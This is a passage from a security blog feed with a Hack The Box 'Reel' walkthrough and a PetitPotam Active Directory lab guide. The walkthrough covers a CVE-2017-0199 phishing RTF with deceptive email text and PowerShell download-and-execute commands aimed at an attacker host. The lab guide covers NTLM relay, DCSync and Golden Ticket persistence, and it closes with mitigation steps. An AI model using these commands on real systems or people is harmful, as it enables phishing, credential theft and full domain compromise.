  <li><code class="language-plaintext highlighter-rouge">Windows Event Forwarding.docx</code></li>
</ul>

<p><img src="/assets/Reel/ftp-listing.jpg" alt="ftp-listing" /></p>

<h3 id="contents-of-readmetxt">Contents of readme.txt</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
</code></pre></div></div>

<h3 id="looks-like-were-going-phishing-d">Looks like we’re going phishing :D</h3>
<p>the content is about someone asking to be emailed RTF formats (a type of document) for him/her to review and convert.</p>

<p>This seems like a <strong>Phishing Challenge</strong>. <em>In order to exploit,</em> we need to:</p>
<ol>
  <li>Find out who that user is</li>
  <li>Find a way to create a malicious RTF file</li>
  <li>Find a way to send an email using the open SMTP port</li>
</ol>

<h3 id="enumerating-smtp">Enumerating SMTP</h3>
<p>We use a tool called <code class="language-plaintext highlighter-rouge">smtp-user-enum</code> which lets us find if a given user exists or not.</p>

<p>It uses a couple of <strong>SMTP</strong> commands to do that:</p>
<ol>
  <li>VRFY</li>
  <li>EXPN</li>
  <li>RCPT</li>
</ol>

<p>we give it a list of male/female names from the <strong>SecLists</strong> Github Repo to try while we look at how to create a malicious document.</p>

<p><img src="/assets/Reel/male-female-wordlists.jpg" alt="male-female-wordlists" /></p>

<p>the command is:</p>

<p><code class="language-plaintext highlighter-rouge">smtp-user-enum -M VRFY -U users.txt -t 10.10.10.77</code></p>

<p>That takes a while to run. And it comes up short. <em>So we move on…</em></p>

<h3 id="checking-file-metadata-using-exiftool">Checking file metadata using <code class="language-plaintext highlighter-rouge">exiftool</code></h3>

<p>When we run <code class="language-plaintext highlighter-rouge">exiftool</code> against the <code class="language-plaintext highlighter-rouge">Windows Event Forwarding.docx</code> file, we do find a user called <code class="language-plaintext highlighter-rouge">nico</code> whose email is <code class="language-plaintext highlighter-rouge">nico@megabank.com</code></p>

<p><img src="/assets/Reel/exiftool-wef-doc.jpg" alt="exiftool-wef-doc" /></p>

<p>we note this down and go verify this user using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code></p>

<h3 id="trying-various-smtp-methods-for-enumeration">Trying various SMTP methods for enumeration</h3>

<p><em>when testing mulitple methods with the</em> <code class="language-plaintext highlighter-rouge">nico</code> <em>user</em>, we still get no hits :/</p>

<p><em>However,</em> we do get a verification when add the <code class="language-plaintext highlighter-rouge">-D</code> flag and supply <code class="language-plaintext highlighter-rouge">megabank.com</code> as the domain.</p>

<p>But only with the <code class="language-plaintext highlighter-rouge">RCPT</code> method:</p>

<p><img src="/assets/Reel/nico-vrfy.jpg" alt="nico-vrfy" /></p>

<p><img src="/assets/Reel/nico-expn.jpg" alt="nico-expn" /></p>

<p><img src="/assets/Reel/nico-rcpt.jpg" alt="nico-rcpt" /></p>

<h3 id="working-on-the-phish">Working on the Phish</h3>

<p>Doing a <strong>Google</strong> search shows an article about <strong>CVE-2017-0199</strong> which looks promising.</p>

<p><img src="/assets/Reel/rtf-exploit-search.jpg" alt="rtf-exploit-search" /></p>

<p><em>According to the article,</em> we should clone a repo (https://github.com/bhdresh/CVE-2017-0199.git) to get a <strong>python</strong> script.</p>

<p>We look at the help:</p>

<p><img src="/assets/Reel/cve-2017-0199-python.jpg" alt="cve-2017-0199-python" /></p>

<p>We need to generate a malicious <code class="language-plaintext highlighter-rouge">RTF</code> document using the first mode <code class="language-plaintext highlighter-rouge">gen</code> and supply a url of an <code class="language-plaintext highlighter-rouge">HTA</code> file to achieve code execution.</p>

<p>Let’s first create the evil <code class="language-plaintext highlighter-rouge">HTA</code> file using <code class="language-plaintext highlighter-rouge">msfvenom</code></p>

<p><img src="/assets/Reel/evil-hta.jpg" alt="evil-hta" /></p>

<p>And create the evil <code class="language-plaintext highlighter-rouge">RTF</code> and call it <code class="language-plaintext highlighter-rouge">review.rtf</code> to look benign</p>

<p><img src="/assets/Reel/evil-rtf.jpg" alt="evil-rtf" /></p>

<p>We host the payload on our kali machine using a standard <code class="language-plaintext highlighter-rouge">python3</code> webserver and start our listener with <code class="language-plaintext highlighter-rouge">nc -lvnp</code> on port 9000</p>

<p><img src="/assets/Reel/hosted-payload.jpg" alt="hosted-payload" /></p>

<p>What’s left is to send the email to <code class="language-plaintext highlighter-rouge">nico@megabank.com</code></p>

<h3 id="sending-the-mail-and-some-deception-">Sending the mail and some deception ;)</h3>
<p>We’re going to use the <code class="language-plaintext highlighter-rouge">sendEmail</code> command with a couple flags:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-t &lt;RECEPIENT&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-f &lt;SENDER&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-s &lt;SMTP_SERVER&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-u &lt;MAIL_SUBJECT&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-a &lt;PATH_TO_ATTACHMENT&gt;</code></li>
  <li><code class="language-plaintext highlighter-rouge">-m &lt;MESSAGE_BODY&gt;</code></li>
</ul>

<p>Our command is:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sendEmail \
-t nico@megabank.com \
-f review@megabank.com \
-s 10.10.10.77 \
-u 'Document for Review' \
-a /opt/CVE-2017-0199/review.rtf \
-m 'Kindly review the attached document. Just press OK if you get an error while opening it and it should be fine.'
</code></pre></div></div>

<p>We try to look non-suspicous as possible. And use a subtle message in the body to have the user click ‘OK’ if he gets an error message (<em>which does happen with this exploit</em>).</p>

<p><img src="/assets/Reel/document-error-1.jpg" alt="document-error-1" /></p>

<p><img src="/assets/Reel/document-error-2.jpg" alt="document-error-2" /></p>

<h3 id="triggering-the-exploit-chain">Triggering the exploit chain</h3>
<p><em>Having everything ready,</em> we trigger the chain:</p>

<ol>
  <li>Send the malicious <code class="language-plaintext highlighter-rouge">RTF</code> file</li>
  <li>The <code class="language-plaintext highlighter-rouge">RTF</code> calls back to the <code class="language-plaintext highlighter-rouge">HTA</code> payload hosted on our kali machine</li>
  <li>The <code class="language-plaintext highlighter-rouge">HTA</code> file is executed and returns a shell on our listening host</li>
</ol>

<p><img src="/assets/Reel/exploit-chain.jpg" alt="exploit-chain" /></p>

<h3 id="brief-note-on-the-article-content">Brief note on the article content</h3>

<p>The guide talks about using an <code class="language-plaintext highlighter-rouge">exe</code> file. We cannot do so because of <code class="language-plaintext highlighter-rouge">Applocker</code>.</p>

<p>We know this because it was mentioned that the user has set up <code class="language-plaintext highlighter-rouge">Hash Rules</code> for multiple file types:</p>

<p><img src="/assets/Reel/Applocker-docx.jpg" alt="Applocker-docx" /></p>

<p>This is why we generated an <code class="language-plaintext highlighter-rouge">HTA</code> payload using <code class="language-plaintext highlighter-rouge">msfvenom</code> instead.</p>

<h3 id="domain-enumeration-using-sharphoundps1">Domain Enumeration using <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code></h3>

<p><em>Since running</em> <code class="language-plaintext highlighter-rouge">.exe</code> <em>is disabled by</em> <strong>Group Policy</strong>, we turn to <code class="language-plaintext highlighter-rouge">BloodHound</code>’s <strong>PowerShell ingestor</strong> (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> method.</p>

<p><em>But before we can do that,</em> we need a <strong>PowerShell</strong> shell.</p>

<p>Switching to <strong>PowerShell</strong> from <strong>CMD</strong> can be done with the below command using the famous <strong>Nishang shell</strong> (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp</code> call at the bottom of the <code class="language-plaintext highlighter-rouge">.ps1</code></p>

<p><code class="language-plaintext highlighter-rouge">powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"</code></p>

<p><em>To run the</em> <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> <em>method</em>, We import the <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> script into memory using the same we ran <code class="language-plaintext highlighter-rouge">Nishang.ps1</code>:</p>

<p><code class="language-plaintext highlighter-rouge">powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/SharpHound.ps1')"</code></p>

<h3 id="a-note-on-sharphoundps1-output">A note on <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> output:</h3>

<p><code class="language-plaintext highlighter-rouge">Sharphound.ps1</code> will generate version 3 <code class="language-plaintext highlighter-rouge">JSON</code> files. Those <em>will not be compatible</em> with the most recent version of <strong>BloodHound</strong> (currently it’s at 4).</p>

<p><img src="/assets/Reel/sharphound-ps1-json-version.jpg" alt="sharphound-ps1-json-version" /></p>

<p><em>To get it working,</em> we will need to get <code class="language-plaintext highlighter-rouge">BloodHound</code> version 3 from the <strong>Official Releases Page</strong> (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)</p>

<h3 id="investigating-possible-exploit-paths">Investigating Possible Exploit Paths</h3>

<p><em>Upon looking at</em> <code class="language-plaintext highlighter-rouge">BloodHound</code>’s <em>output,</em> we notice that <code class="language-plaintext highlighter-rouge">nico</code> can set the <code class="language-plaintext highlighter-rouge">owner</code> for user <code class="language-plaintext highlighter-rouge">herman</code></p>

<p><img src="/assets/Reel/nico-can-write-owner.jpg" alt="nico-can-write-owner" /></p>

<p><em>Simulating having owned the user</em> <code class="language-plaintext highlighter-rouge">herman</code>, we notice we can reach the <code class="language-plaintext highlighter-rouge">backup_admins</code> group.</p>

<p>This is because the <code class="language-plaintext highlighter-rouge">herman</code> user has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> right over it.</p>

<p><img src="/assets/Reel/herman-has-write-dacl.jpg" alt="herman-has-write-dacl" /></p>

<h3 id="abusing-nicos-writeowner-right-over-herman">Abusing <code class="language-plaintext highlighter-rouge">nico</code>’s <code class="language-plaintext highlighter-rouge">WriteOwner</code> right over <code class="language-plaintext highlighter-rouge">herman</code></h3>

<p><em>Checking the help for the</em> <code class="language-plaintext highlighter-rouge">WriteOwner</code> <em>right</em>, we notice we can use <code class="language-plaintext highlighter-rouge">PowerView</code>’s <code class="language-plaintext highlighter-rouge">Set-DomainObjectOwner</code> function.</p>

<p><img src="/assets/Reel/set-dom-obj-owner.jpg" alt="set-dom-obj-owner" /></p>

<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">Set-DomainObjectOwner -Identity herman -OwnerIdentity nico</code></p>

<p>We will need to follow up with <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl -TargetIdentity herman -PrincipalIdentity nico -Rights ResetPassword</code></p>

<p><img src="/assets/Reel/add-dom-object-acl.jpg" alt="add-dom-object-acl" /></p>

<p>And set the password for <code class="language-plaintext highlighter-rouge">herman</code> using <code class="language-plaintext highlighter-rouge">Set-DomainUserPassword</code></p>

<p><img src="/assets/Reel/Set-dom-user-pwd.jpg" alt="Set-dom-user-pwd" /></p>

<p>We create a <code class="language-plaintext highlighter-rouge">secure string</code> object using:</p>

<p><code class="language-plaintext highlighter-rouge">$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></p>

<p>and set the password:</p>

<p><code class="language-plaintext highlighter-rouge">Set-DomainUserPassword -Identity herman -AccountPassword $UserPassword</code></p>

<h3 id="logging-in-as-herman-and-joining-the-backup_admins-group">Logging in as herman and joining the <code class="language-plaintext highlighter-rouge">backup_admins</code> group</h3>

<p><em>After resetting the password for</em> <code class="language-plaintext highlighter-rouge">herman</code>, we’re able to login via the open <code class="language-plaintext highlighter-rouge">SSH</code> port:</p>

<p><img src="/assets/Reel/ssh-as-herman.jpg" alt="ssh-as-herman" /></p>

<p>and we can add ourselves to the <code class="language-plaintext highlighter-rouge">backup_admins</code> group easily with <code class="language-plaintext highlighter-rouge">Add-ADGroupMember 'backup_admins' -members herman</code></p>

<p><img src="/assets/Reel/joining-backup-admins.jpg" alt="joining-backup-admins" /></p>

<h3 id="file-system-access-with-backup_adminss-group-membership">File System access with <code class="language-plaintext highlighter-rouge">backup_admins</code>’s group membership</h3>

<p>We first <em>relog</em> to <em>refresh our access</em> and check our newly-found acccess using <code class="language-plaintext highlighter-rouge">PowerShell</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference = 'silentlycontinue'
ls -recurse -force | ? {$_.fullname -notmatch 'AppData|Application Data|Local Settings'} | ? {(get-acl $_.fullname ).accesstostring -like '*Backup_admins*'} | select -expand fullname
$ErrorActionPreference = 'continue'
</code></pre></div></div>

<p><img src="/assets/Reel/file-access-as-backup-admins.jpg" alt="file-access-as-backup-admins" /></p>

<p>The output suggests we should check out the files in the <code class="language-plaintext highlighter-rouge">Backup Scripts</code> folder.</p>

<p>Checking the <code class="language-plaintext highlighter-rouge">BackupScript.ps1</code> shows a password:</p>

<p><img src="/assets/Reel/backscript-password.jpg" alt="backscript-password" /></p>

<p>Using the password <code class="language-plaintext highlighter-rouge">Cr4ckMeIfYouC4n!</code> works with the administrator user over <code class="language-plaintext highlighter-rouge">SSH</code>:</p>

<p><img src="/assets/Reel/got-admin-path-1.jpg" alt="got-admin-path-1" /></p>

<h3 id="exploit-path-2-nico---tom---claire--backup_admins">Exploit Path #2: <code class="language-plaintext highlighter-rouge">nico</code> -&gt; <code class="language-plaintext highlighter-rouge">tom</code> -&gt; <code class="language-plaintext highlighter-rouge">claire</code> &gt; <code class="language-plaintext highlighter-rouge">backup_admins</code></h3>

<p>On <code class="language-plaintext highlighter-rouge">nico</code>’s desktop we find a file called <code class="language-plaintext highlighter-rouge">cred.xml</code></p>

<p><img src="/assets/Reel/nico-cred-xml.jpg" alt="nico-cred-xml" /></p>

<p><em>looking at its contents,</em> we recognize it’s a <strong>PowerShell Credential Object</strong> that has the username and password of <code class="language-plaintext highlighter-rouge">tom</code></p>

<p><img src="/assets/Reel/ps-cred-object.jpg" alt="ps-cred-object" /></p>

<p>A <strong>PowerShell Credential Object</strong> is used to execute commands <em>using a different set of creds</em> than that of the current user.</p>

<p><em>Without having the password,</em> we can import the credential object using <code class="language-plaintext highlighter-rouge">Import-Clixml</code> cmdlet and use it with the PowerShell <code class="language-plaintext highlighter-rouge">Start-Job</code> cmdlet to launch a <code class="language-plaintext highlighter-rouge">nishang</code> shell as <code class="language-plaintext highlighter-rouge">tom</code></p>

<p><img src="/assets/Reel/cred-to-tom.jpg" alt="cred-to-tom" /></p>

<p>We can also retrieve the plain text password by using the <code class="language-plaintext highlighter-rouge">GetNetworkCredential</code> method of the <code class="language-plaintext highlighter-rouge">System.Management.Automation.PSCredential</code> class:</p>

<p><img src="/assets/Reel/get-network-cred-method.jpg" alt="get-network-cred-method" /></p>

<p><img src="/assets/Reel/toms-password.jpg" alt="toms-password" /></p>

<p>The password works for <code class="language-plaintext highlighter-rouge">tom</code> using <code class="language-plaintext highlighter-rouge">SSH</code></p>

<p><img src="/assets/Reel/tom-ssh.jpg" alt="tom-ssh" /></p>

<p><em>Looking at the exploit path from</em> <code class="language-plaintext highlighter-rouge">tom</code> <em>using</em> <code class="language-plaintext highlighter-rouge">bloodhound</code>, shows the same path like <code class="language-plaintext highlighter-rouge">nico</code></p>

<p><img src="/assets/Reel/tom-owner-claire.jpg" alt="tom-owner-claire" /></p>

<p><img src="/assets/Reel/claire-to-backup-admins.jpg" alt="claire-to-backup-admins" /></p>

<h3 id="exploit-path-3-metasploitation">Exploit Path #3: Metasploitation</h3>

<p>The same exploit for <strong>CVE-2017-0199</strong> exists in a <strong>Metasploit Module</strong> (<code class="language-plaintext highlighter-rouge">windows/fileformat/office_word_hta</code>) when we search using the <code class="language-plaintext highlighter-rouge">rtf</code> keyword:</p>

<p><img src="/assets/Reel/metasploit-rtf-exploit.jpg" alt="metasploit-rtf-exploit" /></p>

<p>setting the options is <strong>critical</strong> here!</p>

<p>We have to set the <code class="language-plaintext highlighter-rouge">SRVHOST</code> option or else it would create the document and embed our <code class="language-plaintext highlighter-rouge">eth0</code> IP address into the document (<em>Troubleshooting this part took me a while</em>).</p>

<p><img src="/assets/Reel/setting-options-msf-exploit.jpg" alt="setting-options-msf-exploit" /></p>

<p>We can send the <code class="language-plaintext highlighter-rouge">doc</code> file to the victim and he would still open it (<em>I didn’t realise this at first and used a</em> <code class="language-plaintext highlighter-rouge">.DOC</code> <em>to</em> <code class="language-plaintext highlighter-rouge">.RTF</code> <em>converter</em>).</p>

<p><img src="/assets/Reel/msf-doc.jpg" alt="msf-doc" /></p>

<p><img src="/assets/Reel/got-meterpreter.jpg" alt="got-meterpreter" /></p>

<p>We will then use <code class="language-plaintext highlighter-rouge">Metasploit</code>’s <code class="language-plaintext highlighter-rouge">local exploit suggester</code> <em>after migrating to a 64-bit process.</em></p>

<p><img src="/assets/Reel/x86-meterpreter.jpg" alt="x86-meterpreter" /></p>

<p><img src="/assets/Reel/migrating-to-64-meterpreter.jpg" alt="migrating-to-64-meterpreter" /></p>

<p>The module finds the host to be <em>vulnerable</em> to <code class="language-plaintext highlighter-rouge">CVE-2019-1458</code> also know as <strong>Wizard Opium</strong>.</p>

<p><img src="/assets/Reel/msf-exp-suggester.jpg" alt="msf-exp-suggester" /></p>

<p>which works like a charm XD</p>

<p><img src="/assets/Reel/wizard-opium-works.jpg" alt="wizard-opium-works" /></p>

<p>another exploit that worked is <code class="language-plaintext highlighter-rouge">CVE-2018-8440</code></p>

<p><img src="/assets/Reel/msf-alpc-privesc.jpg" alt="msf-alpc-privesc" /></p>

<p>Of course these paths are not intended because it’s just using <code class="language-plaintext highlighter-rouge">MetaSploit</code></p>

<h3 id="exploit-path-4-incomplete-abusing-seloaddriverprivilege">Exploit Path #4 (Incomplete): Abusing <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></h3>

<p>The <code class="language-plaintext highlighter-rouge">tom</code> user is a member of the <code class="language-plaintext highlighter-rouge">Print Operators</code> Group which hold the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></p>

<p><img src="/assets/Reel/print-ops-and-load-driver.jpg" alt="print-ops-and-load-driver" /></p>

<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A windows machine with Anonymous FTP allowed. Inspecting the contents reveals a documents folder one of which tells us that RTF documents are being reviewed and converted by someone. Using this information, we craft a malicious document using CVE-2017-0199 and send it to a certain user called nico via the open SMTP port (We find his username by checking the metadata of the documents on FTP). When the document is opened, we get a shell back as nico and start enumerating the machine. With BloodHound, we find that nico has a WriteOwner right over another user herman who has a WriteDACL over a certain group called Backup_Admins. We abuse the WriteOwner right to grant ourselves the right to reset herman’s password and abuse the WriteDACL to add him to the Backup_Admins group. We then find out that Backup_Admins have access to a certain folder called Backup Scripts on the Administrator’s desktop on the box. Within that folder, we find a script that contains the password for the local administrator which works and we use it to login using the open SSH port. A Similar path exists with another user tom whom his credentials are present in a creds.xml file on nico’s desktop as a secure string. The clear-text credentials can be retrieved to gain access as tom using SSH. tom has WriteOwner on claire who has a WriteDACL on Backup_Admins. Another path exists with abusing the SeLoadDriverPrivilege held by tom since he’s a member of the Print Operators group. The box is also vulnerable to CVE-2018-8440 and CVE-2019-1458 local privilege escalation exploits.]]></summary></entry><entry><title type="html">Petitpotam</title><link href="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="Petitpotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/28/PetitPotam</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>

<p><img src="/assets/petitpotam/Petit-Potam-Flow-Diagram.jpg" alt="Petit-Potam-Flow-Diagram" /></p>

<ul>
  <li>The <strong>PetitPotam attack</strong> is a technique where we abuse the <strong>printer bug</strong> (Explained here: https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug) to make a <strong>domain controller</strong> authenticate to our <strong>kali machine</strong>.</li>
  <li><em>Relaying the captured authentication</em> to the <strong>web interface of AD Certificate services (ADCS)</strong> allows us to get the <strong>certificate of the domain controller’s computer account</strong>.</li>
  <li><em>Having this certificate</em> can let us <strong>request a TGT for the computer account</strong>.</li>
  <li><em>And, with a TGT of a Domain Controller’s machine account,</em> we can abuse its <strong>DCSync</strong> right on the domain to retrieve <strong>a full dump containing all domain users’ NTLM hashes</strong>.</li>
  <li><em>Having all user hashes and using them with a simple Pass-the-Hash attack,</em> we can obtain <strong>code execution as a Domain Admin</strong>.</li>
  <li><strong>Persistence</strong> can also be established with a <strong>Golden Ticket</strong> since the <code class="language-plaintext highlighter-rouge">krbtgt</code> account hash would be obtainable.</li>
</ul>

<hr />

<h1 id="tools-needed">Tools needed</h1>
<ol>
  <li><strong>Impacket</strong> (https://github.com/SecureAuthCorp/impacket)</li>
  <li><strong>PetitPotam</strong> (https://github.com/topotam/PetitPotam)</li>
  <li><strong>Rubeus</strong> (https://github.com/GhostPack/Rubeus)</li>
  <li><strong>Mimikatz</strong> (https://github.com/gentilkiwi/mimikatz)</li>
</ol>

<hr />

<h1 id="lab-setup-and-conditions">Lab Setup and Conditions</h1>
<h2 id="1-dclablocal-192168126129">1. DC.lab.local (192.168.126.129)</h2>
<p>A Domain Controller with <strong>Active Directory Certificate Services Web Enrollment</strong> enabled</p>

<p><img src="/assets/petitpotam/Domain-Controllers.jpg" alt="Domain-Controllers" /></p>

<p><img src="/assets/petitpotam/AD-CS-Installed.jpg" alt="AD-CS-Installed" /></p>

<h2 id="2-dc2lablocal-192168126130">2. DC2.lab.local (192.168.126.130)</h2>
<p>Another Domain Controller (<em>PrintSpooler Service must be running to quickly force authentication.</em>)</p>

<p><img src="/assets/petitpotam/Spooler-Running.jpg" alt="Spooler-Running" /></p>

<h2 id="3-kali-machine-192168126132">3. Kali Machine (192.168.126.132)</h2>
<p>for triggering authentication and relaying to ADCS Web UI.</p>

<p><img src="/assets/petitpotam/kali-ip-config.jpg" alt="kali-ip-config" /></p>

<h2 id="4-windows-machine-192168126128">4. Windows Machine (192.168.126.128)</h2>
<p>for requesting a TGT and doing the DCSync attack (The machine shouldn’t be in the domain, but should have the Domain Controller set as its primary DNS server).</p>

<p><img src="/assets/petitpotam/Windows-Attacker-ipconfig.jpg" alt="Windows-Attacker-ipconfig" /></p>

<h2 id="5-normal-user-account-labjohnsmith">5. normal user account (Lab\JohnSmith)</h2>
<p>A regular domain user with no special privileges.</p>

<p><img src="/assets/petitpotam/John-Smith-User.jpg" alt="John-Smith-User" /></p>

<hr />

<h1 id="steps-to-create">Steps to Create</h1>
<h2 id="1-set-up-ntlm-relay-on-our-attacker-host-to-forward-the-captured-authentication-to-adcs-web-ui">1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI</h2>
<p><code class="language-plaintext highlighter-rouge">ntlmrelayx.py -t http://&lt;CA_Server&gt;/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code></p>

<p><img src="/assets/petitpotam/ntlm-relay-start.jpg" alt="ntlm-relay-start" /></p>

<h2 id="2-use-petitpotam-to-force-authentication-from-a-domain-controller-back-to-the-relaying-kali-machine">2. Use PetitPotam to force authentication from a domain controller back to the relaying kali machine</h2>
<p><code class="language-plaintext highlighter-rouge">python3 PetitPotam.py -d &lt;DOMAIN_FQDN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;KALI&gt; &lt;TARGET_DC&gt;</code></p>

<p><img src="/assets/petitpotam/PetitPotam-Launched.jpg" alt="PetitPotam-Launched" /></p>

<h2 id="3-recieve-the-base64-certificate-for-the-domain-controllers-computer-account">3. Recieve the Base64 certificate for the domain controller’s computer account</h2>

<p><img src="/assets/petitpotam/got-dc2-cert.jpg" alt="got-dc2-cert" /></p>

<h2 id="4-use-rubeus-on-the-windows-machine-to-request-a-tgt-for-that-account-using-the-certificate">4. Use Rubeus on the windows machine to request a TGT for that account using the certificate</h2>

<p><code class="language-plaintext highlighter-rouge">.\Rubeus.exe asktgt /outfile:kirbi /dc:&lt;DOMAINCONTROLLER&gt; /domain:&lt;DOMAIN_FQDN&gt; /user:&lt;CAPTURED_DC_COMPUTER_ACCOUNT_NAME&gt; /ptt /certificate:&lt;CAPTURED_BASE64_CERTIFICATE&gt;</code></p>

<p><img src="/assets/petitpotam/rubeus-command.jpg" alt="rubeus-command" /></p>

<p><img src="/assets/petitpotam/got-dc2-tgt.jpg" alt="got-dc2-tgt" /></p>

<h2 id="5-having-the-tgt-in-memory-use-mimikatz-to-do-a-dcsync-attack">5. <em>Having the TGT in memory,</em> use Mimikatz to do a DCSync attack</h2>
<p><code class="language-plaintext highlighter-rouge">lsadump::dcsync /domain:&lt;DOMAINFQDN&gt; /user:&lt;TARGET_USER&gt;</code></p>

<p><img src="/assets/petitpotam/dcsync-for-domain-admin-hash.jpg" alt="dcsync-for-domain-admin-hash" /></p>

<h2 id="6-grab-any-domain-admins-hash-to-have-code-execution">6. Grab any domain admin’s hash to have code execution</h2>

<p><img src="/assets/petitpotam/code-execution-as-administrator.jpg" alt="code-execution-as-administrator" /></p>

<h2 id="7-optional-create-a-golden-ticket-for-persistence">7. (Optional) Create a Golden Ticket for persistence</h2>
<p>Domain SID Lookup: <code class="language-plaintext highlighter-rouge">lookupsid.py &lt;DOMAIN_FQDN&gt;/&lt;USERNAME&gt;@&lt;DC_IP&gt;</code></p>

<p><img src="/assets/petitpotam/domain-sid-lookup.jpg" alt="domain-sid-lookup" /></p>

<p>Obtaining the <code class="language-plaintext highlighter-rouge">krbtgt</code> account’s hash: <code class="language-plaintext highlighter-rouge">lsadump::dcsync /domain:&lt;DOMAIN_FQDN&gt; /user:krbtgt</code></p>

<p><img src="/assets/petitpotam/krbtgt-hash.jpg" alt="krbtgt-hash" /></p>

<p>Golden ticket creation: <code class="language-plaintext highlighter-rouge">ticketer.py -nthash &lt;KRBTGT_HASH&gt; -domain-sid &lt;DOMAIN_SID&gt; -domain &lt;DOMAIN_FQDN&gt; &lt;CAN_BE_NON_EXISTING_USERNAME&gt;</code></p>

<p><img src="/assets/petitpotam/golden-ticket-created.jpg" alt="golden-ticket-created" /></p>

<p>Exporting ticket to the environment: <code class="language-plaintext highlighter-rouge">export KRB5CCNAME=/&lt;CHOSEN_USERNAME&gt;.ccache</code></p>

<p>Command execution using ticket: <code class="language-plaintext highlighter-rouge">psexec.py &lt;DOMAIN_FQDN&gt;/&lt;CHOSEN_USERNAME&gt;@&lt;DC_FQDN&gt; -k -no-pass</code></p>

<p><img src="/assets/petitpotam/golden-ticket-used.jpg" alt="golden-ticket-used" /></p>

<hr />

<h1 id="mitigation">Mitigation:</h1>
<h2 id="1-enable-epa-for-certificate-authority-web-enrollment">1. Enable EPA for Certificate Authority Web Enrollment</h2>
<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; CertSrv -&gt; Authentication -&gt; Windows Authentication -&gt; Right-click -&gt; Advanced Settings -&gt; Extended Protection: Required</p>

<p><img src="/assets/petitpotam/certsrv-epa-required.jpg" alt="certsrv-epa-required" /></p>

<h2 id="2-enable-epa-for-certificate-enrollment-web-service">2. Enable EPA for Certificate Enrollment Web Service</h2>
<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; <CA_NAME>\_CES\_Kerberos -&gt; Authentication -&gt; Windows Authentication -&gt; Right-click -&gt; Advanced Settings -&gt; Extended Protection: Required</CA_NAME></p>

<p><img src="/assets/petitpotam/certentrollwebsvc-epa-required.jpg" alt="certentrollwebsvc-epa-required" /></p>

<p>After enabling EPA in the UI, the <code class="language-plaintext highlighter-rouge">Web.config</code> file created by CES role at <code class="language-plaintext highlighter-rouge">&lt;%windir%&gt;\systemdata\CES\&lt;CA Name&gt;_CES_Kerberos\web.config</code> should also be updated by adding <code class="language-plaintext highlighter-rouge">&lt;extendedProtectionPolicy&gt;</code> set with a value of <code class="language-plaintext highlighter-rouge">Always</code></p>

<p><img src="/assets/petitpotam/web-config-editing.jpg" alt="web-config-editing" /></p>

<h2 id="3-enable-require-ssl-which-will-enable-only-https-connections">3. Enable Require SSL, which will enable only HTTPS connections.</h2>
<p>IIS Manager -&gt; Sites -&gt; Default Web Site -&gt; CertSrv -&gt; SSL Settings -&gt; Require SSL</p>

<p><img src="/assets/petitpotam/cert-srv-require-ssl.jpg" alt="cert-srv-require-ssl" /></p>

<h2 id="4-restart-iis">4. Restart IIS</h2>
<p><em>From an elevated command prompt,</em> type: <code class="language-plaintext highlighter-rouge">iisreset /restart</code></p>

<hr />

<h1 id="conclusion">Conclusion</h1>
<p>Having a non-secure AD CS Installation in a domain can present an attacker with an easy way to achieve Domain Admin privileges and gain Persistence.
Luckily enough, with some simple mitigation steps, this can be resolved.</p>

<hr />

<h1 id="credits">Credits</h1>
<ol>
  <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote this excellent paper (https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)</li>
  <li><strong>Lionel Gilles</strong> for creating the <strong>PetitPotam</strong> Python Script</li>
  <li><strong>Yang Zhang</strong> of Back2Zero team &amp; <strong>Yongtao Wang</strong> (@Sanr) of BCM Social Corp, <strong>Eyal Karni, Marina Simakov and Yaron Zinar</strong> from Preempt &amp; <strong>n1nty</strong> from A-TEAM of Legendsec at Qi’anxin Group for the <strong>PrinterBug</strong> (CVE-2019-1040)</li>
  <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts</li>
  <li><strong>Benjamin Delpy</strong> for the legendary <strong>mimikatz</strong></li>
